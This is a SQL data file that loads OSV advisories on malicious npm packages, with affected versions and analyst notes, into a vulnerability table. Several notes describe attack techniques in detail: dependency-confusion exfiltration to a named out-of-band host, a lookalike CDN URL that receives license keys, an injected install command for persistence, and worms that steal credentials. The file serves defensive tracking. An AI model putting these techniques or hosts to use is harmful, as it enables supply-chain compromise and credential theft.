INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-4855', 'OSV', 'networkx', 'npm', 'Malicious code in networkx (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (7ca30d930400b8c13a77995d9249cc90207ed207eef9973b5ee86f4c79866ffa)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.0"]'::jsonb, '0.0', '2025-06-10 03:18:05+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-6138', 'OSV', 'yxt-open-data', 'npm', 'Malicious code in yxt-open-data (npm)', 'The package communicates with a domain associated with malicious activity.

---
_-= Per source details. Do not edit below this line.=-_
', '["2.0.999"]'::jsonb, '0.0', '2025-07-16 01:15:40+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-190522', 'OSV', 'node-calculator-ac24', 'npm', 'Malicious code in node-calculator-ac24 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (0d8918452cf7ce73c18c2a4f90264358ac5db009921c8418680cac74f0ff9a04)
The package node-calculator-ac24 was found to contain malicious code.

## Source: ossf-package-analysis (64501d10305693b364163d31121c0817b3a81db6bab951ed461411213c013b1c)
The OpenSSF Package Analysis project identified ''node-calculator-ac24'' @ 2.1.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["2.1.0"]'::jsonb, '0.0', '2025-11-17 13:15:46+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-2867', 'OSV', 'cloudflare-vite-tutorial', 'npm', 'Malicious code in cloudflare-vite-tutorial (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["99.99.99"]'::jsonb, '0.0', '2025-03-28 12:42:09+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-190910', 'OSV', '@postman/pretty-ms', 'npm', 'Malicious code in @postman/pretty-ms (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (d2d31f7cbd143304b0472244ba5f73daa6e96abbc923b854d2736c5ea7807d16)
The package @postman/pretty-ms was found to contain malicious code.

## Source: google-open-source-security (a192228d5b40d7e363a0fb0b85a17ef6329d4bf85b8748a7aa1ee3c18f7c123a)
This package was compromised by the Sha1-Hulud: The Second Coming NPM worm.
The malicious payload steals tokens and credentials and publishes them to
GitHub. The worm will propogate itself to NPM packages the user owns and
establish persistence is a GitHub action.
The package may also destroy the user''s home directory.
', '["6.1.1", "6.1.3", "6.1.2"]'::jsonb, '0.0', '2025-11-24 16:31:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-1328', 'OSV', 'bitmart-test', 'npm', 'Malicious code in bitmart-test (npm)', 'This package runs commands in a pre-install script that exfils sensitive data to a attacker-controlled domain.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (0ca51f117bee2cff1b712ba689ce844c19ec597faf4268714f41fb013e464c6e)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["19.4.9"]'::jsonb, '0.0', '2025-02-13 04:45:26+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-47583', 'OSV', 'discord-open-source', 'npm', 'Malicious code in discord-open-source (npm)', 'The package discord-open-source was found to contain malicious code.

---
_-= Per source details. Do not edit below this line.=-_

## Source: google-open-source-security (8428b55f07242cb67f60ccba8d02146498255552e19df02bb8d05fce64279ac3)
This package installs a dependency hosted on a custom domain that runs an
info stealer during installation. The info stealer focuses on stealing
npm, git, and other CI/CD related tokens.
', '["1.0.0"]'::jsonb, '0.0', '2025-09-25 15:07:06+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-1993', 'OSV', 'cocaine-bear-full-movies-online-free-at-home-on-123moviesed7', 'npm', 'Malicious code in cocaine-bear-full-movies-online-free-at-home-on-123moviesed7 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2024-06-25 12:33:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-184', 'OSV', 'yunxohang4', 'npm', 'Malicious code in yunxohang4 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (7d338ce37d2952ccdcf9637c7dc760e409b9b046a0406e0aef49ef84d1ab6bf9)
The package yunxohang4 was found to contain malicious code.

## Source: ghsa-malware (aa3fc62cbb33b48a9dc4c66dd69e7a0ea084d25daf9ef0c90812126ac4d5f755)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (b3930661f51ca86e72d6e3aa0d66cc8f8d6e2b510fdabfb70660371f6e859c61)
The OpenSSF Package Analysis project identified ''yunxohang4'' @ 9.9.9 (npm) as malicious.

It is considered malicious because:

- The package executes one or more commands associated with malicious behavior.
', '["9.9.9"]'::jsonb, '0.0', '2025-12-26 10:20:32+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-7086', 'OSV', '@youse-seguradora/youse-frontend', 'npm', 'Malicious code in @youse-seguradora/youse-frontend (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.999.1", "1.999.2"]'::jsonb, '0.0', '2024-06-25 12:23:15+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-1790', 'OSV', 'avx-web-core', 'npm', 'Malicious code in avx-web-core (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1000.0.1"]'::jsonb, '0.0', '2024-06-25 12:28:55+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-585', 'OSV', 'diffuse-the-rest', 'npm', 'Malicious code in diffuse-the-rest (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (1d6fa5846f752815846e4ce59d5326d7627b0c0ce460f8c2d36c2953b682766b)
The OpenSSF Package Analysis project identified ''diffuse-the-rest'' @ 1.1.2 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["1.1.1", "1.1.2"]'::jsonb, '0.0', '2025-01-25 19:25:56+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-48291', 'OSV', 'eslint-js-config', 'npm', 'Malicious code in eslint-js-config (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (6662e6d5b878c4eb877089ca5baf3bd40947a9e14dc394e9f11e935facea5b5b)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["0.3.0", "0.3.1", "0.3.2", "0.3.3"]'::jsonb, '0.0', '2025-10-10 03:38:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-10773', 'OSV', 'rct-calculator', 'npm', 'Malicious code in rct-calculator (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (53d42a5f1b620b206b85fa553b60cc9f0bba3f0b16ab0d8ba57a635125fb3f28)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (6d1c980d6a9d6e2bcc2c65ee51b1bc89296e648af2d17e4c01f1cdd5eae79a94)
The OpenSSF Package Analysis project identified ''rct-calculator'' @ 6.5.8 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["6.5.8"]'::jsonb, '0.0', '2024-11-15 04:09:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-2015', 'OSV', 'config-storages', 'npm', 'Malicious code in config-storages (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["3.41.2"]'::jsonb, '0.0', '2024-06-25 12:34:12+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-7059', 'OSV', 'iobeya-time-utils', 'npm', 'Malicious code in iobeya-time-utils (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (3b5b2fd0fb985e16671bbfe20f9b7b2ef8e7a62cc0050b51cea290d85574f75c)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: ossf-package-analysis (5cc94a15fd9feb4f7fd5146415061bfe386fd2d185f1e0d80fc3ecd40ce7adb2)
The OpenSSF Package Analysis project identified ''iobeya-time-utils'' @ 3.0.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.

- The package executes one or more commands associated with malicious behavior.
', '["3.0.0"]'::jsonb, '0.0', '2024-06-29 19:55:32+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-3556', 'OSV', 'passports-twitter', 'npm', 'Malicious code in passports-twitter (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (3ed2e22762097011eaacc32402595cb2ee0cc37014af41523745f7fd75f14f32)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.5", "1.0.6"]'::jsonb, '0.0', '2025-04-30 09:06:53+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-3657', 'OSV', 'wdio-healenium-service', 'npm', 'Malicious code in wdio-healenium-service (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (3f69202ef10fb1de6b44e69a626d1d52c6871dd969a2e7d39b28a05b9224eeb4)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.0"]'::jsonb, '0.0', '2025-05-06 05:25:11+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-5426', 'OSV', '@oplus/obus-web-sdk-plugin-recovery', 'npm', 'Malicious code in @oplus/obus-web-sdk-plugin-recovery (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (a7435b09e6ec064fe7ff0738becd8dd3445f1a73e97427a8fb9285460bd4f723)
@oplus/obus-web-sdk-plugin-recovery@99.99.99 publishes to a likely-private internal scope at an artificially high version to win resolution against an organization''s internal package. On `npm install`, scripts/postinstall.js executes automatically and: (1) reads os.userInfo().username, os.hostname(), and process.cwd(); (2) fetches the installer''s public IP from api.ipify.org; (3) hex-encodes the collected fields and issues a DNS lookup of `<payload>.xjaipnfhcpawuhzlgzkzo1ak3aai9m873.oast.fun`, leaking the data via the subdomain label to an interactsh out-of-band C2; (4) base64-encodes the same payload and sends it as an `x-poc` header in an HTTPS GET to https://xjaipnfhcpawuhzlgzkzo1ak3aai9m873.oast.fun/poc. The file labels itself a ''Dependency Confusion PoC - Bug Bounty Research,'' but the runtime behavior is unconditional exfiltration of installer identity to a third-party endpoint, with no opt-out, on every install. Combined with the 99.99.99 version pin against the @oplus scope, this is the classic dependency-confusion attack shape and is harmful to any installer who resolves it.
', '["99.99.99"]'::jsonb, '0.0', '2026-06-09 17:16:34+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-41531', 'OSV', 'adhybridhealthservice-resource-manager', 'npm', 'Malicious code in adhybridhealthservice-resource-manager (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["9.9.9"]'::jsonb, '0.0', '2025-08-28 07:18:12+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-169', 'OSV', 'braze-web-sdk', 'npm', 'Malicious code in braze-web-sdk (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (b5e81df6fadd36a9f51f5daab0483c919db2c42225a2e96eb0bf40c01be8eb16)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["3.0.0"]'::jsonb, '0.0', '2025-01-20 07:36:56+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-3626', 'OSV', 'internallib_v921', 'npm', 'Malicious code in internallib_v921 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (a2d85ca5bec57f8bdf71ccddd637037d50c3a8d215c375ab6bcfba881c336175)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.0.1", "1.0.2", "1.0.3"]'::jsonb, '0.0', '2025-05-06 07:00:01+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2768', 'OSV', 'h3-next', 'npm', 'Malicious code in h3-next (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (41a779cef19955b279051dff59351c5f041b3834e2c9bd972c0b0be096aa767f)
The package h3-next was found to contain malicious code.
', '["99.99.9"]'::jsonb, '0.0', '2026-04-16 10:00:02+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3093', 'OSV', 'tempomati-omega-5-emcuf31', 'npm', 'Malicious code in tempomati-omega-5-emcuf31 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.1", "1.0.0"]'::jsonb, '0.0', '2024-06-25 13:03:11+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-3863', 'OSV', '@antv/component', 'npm', 'Malicious code in @antv/component (npm)', 'Part of the **Mini Shai-Hulud** supply chain attack campaign in which a threat actor compromised the npm account `atool` and published 631 malicious versions across 314 npm packages in an automated 22-minute burst. Each malicious version injects a `preinstall` hook that executes a 498KB obfuscated Bun script, using the GitHub API as a covert exfiltration channel. Credentials are committed to attacker-controlled repositories following Dune-themed naming patterns (e.g., `harkonnen-melange-742`). Stolen data includes AWS keys, GitHub PATs, npm tokens, GCP service accounts, Azure credentials, Kubernetes service account tokens, SSH keys, Docker auth configs, database connection strings, Stripe keys, and Slack tokens. Malicious versions also establish persistence via CI/CD workflow injection (a GitHub Actions workflow named `Run Copilot` dumps all secrets via `toJSON(secrets)`), AI agent session hooks, and a system daemon named `kitty-monitor`.

This specific package (`@antv/component`) was modified to include a malicious `preinstall` hook executing the obfuscated Bun payload.

---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (00527718d8f650f1b7685e18a3bd60a962b57b1a1520823d000c14d3185708d6)
The package @antv/component was found to contain malicious code.

## Source: ghsa-malware (4a4767279be16d6ebe766219e75edf2d4711d8144a198e488fb6532f8c06af55)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (847ef6b381d410bf176f7414a6f0fbbcf46a5f39b6d9011e126b279bd2d781df)
This package was compromised as part of the ongoing "Mini Shai-Hulud is back" worm by the TeamPCP threat actor.

The package will steal credentials and then propogate it to every package it has access to. The package also attempts to remain persistent.
', '["2.2.11", "2.3.11"]'::jsonb, '0.0', '2026-05-19 00:00:00+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-1804', 'OSV', 'backbone-input-view', 'npm', 'Malicious code in backbone-input-view (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["2.0.0", "3.0.1"]'::jsonb, '0.0', '2024-06-25 12:29:20+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-1309', 'OSV', 'gate-test', 'npm', 'Malicious code in gate-test (npm)', 'This package runs commands in a pre-install script that exfils sensitive data to a attacker-controlled domain.

---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (5ee3dfdcc84d19985325184c8a476958e1ce412b73f69f004d0041aa84910747)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["19.4.9"]'::jsonb, '0.0', '2025-02-13 01:50:25+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3960', 'OSV', 'worker-service', 'npm', 'Malicious code in worker-service (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["99.9.9"]'::jsonb, '0.0', '2024-06-25 13:22:10+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-49026', 'OSV', 'no-only-tests', 'npm', 'Malicious code in no-only-tests (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (e0357be77e7b06c343a0d5b8671fc3a8983d9d1187381a5159b3175a579ebcaa)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (97eaaf0f1b9330331d16b142f1197fef1e0fbfd58a294b271ad47ba8420d1e71)
This package installs a dependency hosted on a custom domain that runs an
info stealer during installation. The info stealer focuses on stealing
npm, git, and other CI/CD related tokens.
', '["9.9.0"]'::jsonb, '0.0', '2025-10-29 22:45:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-5190', 'OSV', 'hbsig', 'npm', 'Malicious code in hbsig (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: google-open-source-security (146faaf0d97c6a533a969bc3f3f117811f9317dc865ed4ab37f1679842ddeaae)
This package was compromised as part of the IronWorm campaign. This campaign executes a malicious binary payload during installation via a preinstall hook. The payload is a Rust-built infostealer that targets developer environments, scanning for and harvesting credentials related to cloud providers, object storage, databases, source-control, package registries, and AI developer tools. It also targets cryptocurrency wallets, specifically injecting a malicious JavaScript hook into the Exodus desktop wallet to capture passwords and recovery phrases. Furthermore, the malware exhibits worm-like behavior by stealing GitHub and NPM credentials to push malicious updates to the victim''s repositories and publish trojanized packages, and it uses an eBPF-based kernel rootkit to hide its processes and network connections on Linux systems.
', '["0.3.2"]'::jsonb, '0.0', '2026-06-04 22:27:40+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-1306', 'OSV', 'ethers-transactions', 'npm', 'Malicious code in ethers-transactions (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ghsa-malware (31d30dcd73ba06a4962c3e3b0419d5864aa9f93f1dcf516e1830eafa40f44ab7)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.
', '["1.2.9", "1.2.4", "1.2.5", "1.2.3", "1.2.8", "1.2.1", "1.2.6", "1.2.2", "1.2.7"]'::jsonb, '0.0', '2024-04-29 08:37:44+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-8897', 'OSV', 'onfido-web-sdk-angular', 'npm', 'Malicious code in onfido-web-sdk-angular (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (b0dd02cb44d3292fc8de6ab92614219cc989a1d92d108bf83dc0a40883b44f0d)
The OpenSSF Package Analysis project identified ''onfido-web-sdk-angular'' @ 0.1.0 (npm) as malicious.

It is considered malicious because:

- The package communicates with a domain associated with malicious activity.
', '["0.1.0"]'::jsonb, '0.0', '2024-09-18 07:40:41+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-6391', 'OSV', '@bat-sec/pr0tobuff-loaders', 'npm', 'Malicious code in @bat-sec/pr0tobuff-loaders (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["1.0.0"]'::jsonb, '0.0', '2025-07-31 19:17:30+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2025-191504', 'OSV', 'testhaus', 'npm', 'Malicious code in testhaus (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (b9f0d8de5427f60c269fe53d3a876a67c03dc5c393599a5ca2b35d538fce9c3a)
The package testhaus was found to contain malicious code.
', '["99.9.8"]'::jsonb, '0.0', '2025-12-01 16:00:47+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-4579', 'OSV', 'hpsetup', 'npm', 'Malicious code in hpsetup (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (16ed0c34d69e1ea3c5052e3eed20b87fc47e8d4bf1393f7117d34b847347e12c)
When `npx hpsetup <key>` runs, the tool fetches a tarball from `https://hpsetup-cdn.932324.xyz/api/tarball/<slug>/<version>?key=<userKey>` and extracts it directly into `node_modules/@heroui-pro/react` (or `heroui-native-pro`) with no hash check, no signature verification, and no version pin to a publisher origin (src/constants.js:16, src/download.js:24). The destination is a numeric `.xyz` subdomain unrelated to HeroUI''s real publisher infrastructure, and the package itself ships no `homepage`, `repository`, or `author` fields linking it to heroui.com — yet it brands itself as the HeroUI Pro setup tool and writes into the `@heroui-pro` scope on the consumer''s disk. Whatever bytes the CDN returns become the React component library required at runtime, giving the operator of `932324.xyz` arbitrary code execution in every consuming application. The user''s license key (HEROUI_KEY / hp_xxx) is appended as `?key=<userKey>` to every CDN fetch, silently relaying paying-customer credentials to the lookalike host (src/download.js:24). After download, the tool patches `vercel.json` to set `installCommand: npx -y hpsetup@latest <userKey>` (src/vercel.js:18-29), pinning every future Vercel deployment to re-fetch code from the same `.xyz` CDN and re-send the key — non-interactive runs skip the prompt and apply this automatically. The downloaded tarball''s `dist/postinstall/` directory and `scripts.postinstall` entry are silently scrubbed from the `package.json` before the package manager sees it (src/download.js:11-19), concealing whatever lifecycle script the CDN delivered from npm/pnpm/bun audit and trust prompts. Before any user prompt, the flow also patches `pnpm-workspace.yaml` allowBuilds / `pnpm.onlyBuiltDependencies` / `trustedDependencies` to auto-trust `@heroui-pro/react` and `heroui-native-pro` (src/install.js:80-92, src/trust.js:1), elevating the privilege of CDN-delivered code without consent. The combination — non-publisher mutable code drop, license-key exfiltration to that same host, CI persistence, postinstall concealment, and silent trust-store mutation — is unambiguous attacker infrastructure impersonating HeroUI Pro.
', '["4.5.3-beta.15", "4.5.5-beta.0", "4.5.3-beta.21", "4.5.5-beta.2", "4.5.5-beta.8", "4.5.5-beta.9", "4.5.5-beta.7", "4.5.5-beta.3", "4.5.3-beta.7", "4.5.7-beta.1", "4.6.0"]'::jsonb, '0.0', '2026-05-20 00:54:17+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-2079', 'OSV', '@emilgroup/task-sdk-node', 'npm', 'Malicious code in @emilgroup/task-sdk-node (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: amazon-inspector (d10e089e1ab5774c571e6a0f5c650a044301456e9558509c051d38dce51eac73)
The package @emilgroup/task-sdk-node was found to contain malicious code.

## Source: ghsa-malware (4e34cfe3877106fd3289f2693ee500f690582222cf04fe5abfc900b5de70ab26)
Any computer that has this package installed or running should be considered fully compromised. All secrets and keys stored on that computer should be rotated immediately from a different computer. The package should be removed, but as full control of the computer may have been given to an outside entity, there is no guarantee that removing the package will remove all malicious software resulting from installing it.

## Source: google-open-source-security (4ba489f3f20a868cb822329b2657fdb7fe02151a54631e195c2bc519cd931626)
This package was compromised by the CanisterWorm campaign by the TeamPCP
threat actor. The malicious payload establishes persistence as user systemd
service and places a backdoor on the infected host. The malware will also
harvest npm credentials and can autonomously spread.
', '["1.0.4", "1.0.3", "1.0.2"]'::jsonb, '0.0', '2026-03-22 18:27:31+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2024-3556', 'OSV', 'updated-tricks-v-bucks-generator-free_2023-asw2', 'npm', 'Malicious code in updated-tricks-v-bucks-generator-free_2023-asw2 (npm)', '
---
_-= Per source details. Do not edit below this line.=-_
', '["5.2.7"]'::jsonb, '0.0', '2024-06-25 13:13:13+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2026-5241', 'OSV', 'create-wrangler-deploy', 'npm', 'Malicious code in create-wrangler-deploy (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: google-open-source-security (a6c7977dbc054cdb7fe56da0d2fbd26e2a6fed695deb4263ccbf4adfedd86acb)
The Miasma malware is a self-propagating worm that spreads across the npm registry by abusing weaponized `binding.gyp` files to achieve execution during package installation, bypassing security tools that only inspect package lifecycle scripts. Upon execution, the malware attempts to exfiltrate credentials and OIDC tokens for various cloud and registry services, and propagates by compromising other packages managed by the stolen accounts or committing backdoor files to GitHub repositories.
', '["0.1.1"]'::jsonb, '0.0', '2026-06-05 00:53:43+00') ON CONFLICT (id) DO NOTHING;
INSERT INTO public_vulnerabilities (id, source, package_name, ecosystem, summary, details, affected_versions, cvss_score, published_at) VALUES ('MAL-2023-1347', 'OSV', 'wrangler-dev-api-app', 'npm', 'Malicious code in wrangler-dev-api-app (npm)', '
---
_-= Per source details. Do not edit below this line.=-_

## Source: ossf-package-analysis (61404905188d42181fbf3217b2ebffe91c1328a0cd469718a53faec95f244738)
The OpenSSF Package Analysis project identified ''wrangler-dev-api-app'' @ 24.12.47 (npm) as malicious.

It is considered malicious because:
- The package communicates with a domain associated with malicious activity.
